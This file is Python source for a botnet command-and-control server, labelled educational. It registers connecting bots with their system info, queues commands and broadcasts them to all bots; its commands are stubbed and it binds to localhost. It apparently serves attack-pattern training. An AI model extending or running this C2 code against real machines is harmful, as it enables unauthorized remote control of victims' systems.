import socket
import threading
import json
import time
from datetime import datetime

class EducationalCCServer:
    """
    Educational C&C Server for cybersecurity training
    WARNING: For educational purposes only - demonstrates attack patterns
    """

    def __init__(self, host='localhost', port=8888):
        self.host = host
        self.port = port
        self.bots = {}  # Connected bots registry
        self.commands_queue = []
        self.server_socket = None
        self.running = False

    def start_server(self):
        """Initialize and start the C&C server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(100)
            self.running = True

            print(f"[TRAINING] C&C Server started on {self.host}:{self.port}")

            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    print(f"[TRAINING] New connection from {address}")

                    # Handle each bot in separate thread
                    bot_thread = threading.Thread(
                        target=self.handle_bot,
                        args=(client_socket, address)
                    )
                    bot_thread.daemon = True
                    bot_thread.start()

                except socket.error:
                    if self.running:
                        print("[TRAINING] Socket error occurred")

        except Exception as e:
            print(f"[TRAINING] Server error: {e}")
        finally:
            self.cleanup()

    def handle_bot(self, client_socket, address):
        """Handle individual bot connections and communications"""
        bot_id = None
        try:
            while self.running:
                # Receive data from bot
                data = client_socket.recv(4096)
                if not data:
                    break

                try:
                    message = json.loads(data.decode('utf-8'))
                    response = self.process_bot_message(message, address)

                    if message.get('type') == 'registration':
                        bot_id = message.get('bot_id')
                        self.bots[bot_id] = {
                            'socket': client_socket,
                            'address': address,
                            'last_seen': datetime.now(),
                            'info': message.get('system_info', {})
                        }

                    # Send response back to bot
                    if response:
                        client_socket.send(json.dumps(response).encode('utf-8'))

                except json.JSONDecodeError:
                    print(f"[TRAINING] Invalid JSON from {address}")

        except Exception as e:
            print(f"[TRAINING] Error handling bot {address}: {e}")
        finally:
            if bot_id and bot_id in self.bots:
                del self.bots[bot_id]
            client_socket.close()
            print(f"[TRAINING] Bot {address} disconnected")

    def process_bot_message(self, message, address):
        """Process different types of messages from bots"""
        msg_type = message.get('type')

        if msg_type == 'registration':
            print(f"[TRAINING] Bot registration: {message.get('bot_id')} from {address}")
            return {
                'type': 'registration_ack',
                'status': 'success',
                'server_time': datetime.now().isoformat()
            }

        elif msg_type == 'heartbeat':
            bot_id = message.get('bot_id')
            if bot_id in self.bots:
                self.bots[bot_id]['last_seen'] = datetime.now()

            # Check for pending commands
            pending_commands = self.get_pending_commands(bot_id)
            return {
                'type': 'heartbeat_ack',
                'commands': pending_commands
            }

        elif msg_type == 'command_result':
            print(f"[TRAINING] Command result from {address}: {message.get('result')}")
            return {'type': 'result_ack'}

        return None

    def get_pending_commands(self, bot_id):
        """Retrieve pending commands for specific bot"""
        # In real scenarios, this would check a command queue
        # For training, return sample commands
        return [
            {
                'cmd_id': 'demo_001',
                'command': 'info',
                'params': {}
            }
        ]

    def broadcast_command(self, command):
        """Send command to all connected bots"""
        disconnected_bots = []

        for bot_id, bot_info in self.bots.items():
            try:
                cmd_message = {
                    'type': 'command',
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }
                bot_info['socket'].send(json.dumps(cmd_message).encode('utf-8'))
                print(f"[TRAINING] Command sent to bot {bot_id}")

            except Exception as e:
                print(f"[TRAINING] Failed to send command to {bot_id}: {e}")
                disconnected_bots.append(bot_id)

        # Clean up disconnected bots
        for bot_id in disconnected_bots:
            del self.bots[bot_id]

    def get_bot_status(self):
        """Return current bot status for monitoring"""
        return {
            'total_bots': len(self.bots),
            'bots': {
                bot_id: {
                    'address': str(info['address']),
                    'last_seen': info['last_seen'].isoformat(),
                    'system_info': info['info']
                }
                for bot_id, info in self.bots.items()
            }
        }

    def cleanup(self):
        """Clean shutdown of server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        print("[TRAINING] C&C Server stopped")

